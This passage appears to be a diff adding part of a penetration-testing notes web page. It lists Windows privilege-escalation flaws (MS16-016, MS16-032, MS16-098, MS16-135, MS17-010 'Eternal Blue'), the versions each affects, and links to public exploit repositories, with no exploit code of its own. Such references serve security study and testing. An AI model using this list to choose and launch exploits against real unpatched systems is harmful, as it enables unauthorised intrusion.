+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT 8.1[1] (3126587)</li>
+                      <li>Windows RT 8.1[1] (3126593)</li>
+                      <li>Windows 10 for 32-bit Systems</li>
+                      <li>Windows 10 for x64-based Systems</li>
+                      <li>Windows 10 Version 1511 for 32-bit
+                      Systems</li>
+                      <li>Windows 10 Version 1511 for x64-based
+                      Systems</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                    </ul>
+                    <h3>MS16-016 "mrxdav.sys"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/koczkatamas/CVE-2016-0051">
+                        https://github.com/koczkatamas/CVE-2016-0051</a>
+                      </li>
+                    </ul>
+                    <h3>MS16-032 "secondary logon"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT 8.1 [1] (3139914)</li>
+                      <li>Windows 10 for 32-bit Systems</li>
+                      <li>Windows 10 for x64-based Systems</li>
+                      <li>Windows 10 Version 1511 for 32-bit
+                      Systems</li>
+                      <li>Windows 10 Version 1511 for x64-based
+                      Systems</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/khr0x40sh/ms16-032">https://github.com/khr0x40sh/ms16-032</a>
+                      </li>
+                      <li>
+                        <a href=
+                        "https://www.exploit-db.com/exploits/39719/">
+                        https://www.exploit-db.com/exploits/39719/</a>
+                      </li>
+                    </ul>
+                    <h3>MS16-098 "RGNOBJ"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows RT 8.1[1] （3177725）</li>
+                      <li>Windows 10 for 32-bit Systems</li>
+                      <li>Windows 10 for x64-based Systems</li>
+                      <li>Windows 10 Version 1511 for 32-bit
+                      Systems</li>
+                      <li>Windows 10 Version 1511 for x64-based
+                      Systems</li>
+                      <li>Windows 10 Version 1607 for 32-bit
+                      Systems</li>
+                      <li>Windows 10 Version 1607 for x64-based
+                      Systems</li>
+                    </ul>
+                    <h3>MS16-135 "NtSetWindowLongPtr"</h3>
+                    <h4>Affected Versions</h4>
+                    <ul>
+                      <li>Windows Vista Service Pack 2</li>
+                      <li>Windows Vista x64 Edition Service Pack
+                      2</li>
+                      <li>Windows Server 2008 for 32-bit Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for x64-based Systems
+                      Service Pack 2</li>
+                      <li>Windows Server 2008 for Itanium-based
+                      Systems Service Pack 2</li>
+                      <li>Windows 7 for 32-bit Systems Service Pack
+                      1</li>
+                      <li>Windows 7 for x64-based Systems Service
+                      Pack 1</li>
+                      <li>Windows Server 2008 R2 for x64-based
+                      Systems Service Pack 1</li>
+                      <li>Windows Server 2008 R2 for Itanium-based
+                      Systems Service Pack 1</li>
+                      <li>Windows 8.1 for 32-bit Systems</li>
+                      <li>Windows 8.1 for x64-based Systems</li>
+                      <li>Windows Server 2012</li>
+                      <li>Windows Server 2012 R2</li>
+                      <li>Windows 10 for 32-bit Systems</li>
+                      <li>Windows 10 for x64-based Systems</li>
+                      <li>Windows 10 Version 1511 for 32-bit
+                      Systems</li>
+                      <li>Windows 10 Version 1511 for x64-based
+                      Systems</li>
+                      <li>Windows Server 2016 for x64-based
+                      Systems</li>
+                    </ul>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/FSecureLABS/CVE-2016-7255">
+                        https://github.com/FSecureLABS/CVE-2016-7255</a>
+                      </li>
+                      <li>
+                        <a href=
+                        "https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1">
+                        https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/MS16-135/MS16-135.ps1</a>
+                      </li>
+                    </ul>
+                    <h3>MS17-010 "Eternal Blue"</h3>
+                    <h4>Affected Versions</h4>
+                    <h4>Reliable Exploits</h4>
+                    <ul>
+                      <li>
+                        <a href=
+                        "https://github.com/3ndG4me/AutoBlue-MS17-010">
+                        zzz_exploit</a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+      <script src=
+      "https://eli2k.com/resources/js/searchFile.js"></script> 
+      <script src=
+      "https://eli2k.com/resources/js/buttonCategories.js"></script>
+    </div>
+    <script src=
+    "https://eli2k.com/resources/js/themeSwitch.js"></script>
+    <script src=
+    "https://eli2k.com/resources/js/collapseList.js"></script>
+    
+  </div>
+</body>
+</html>
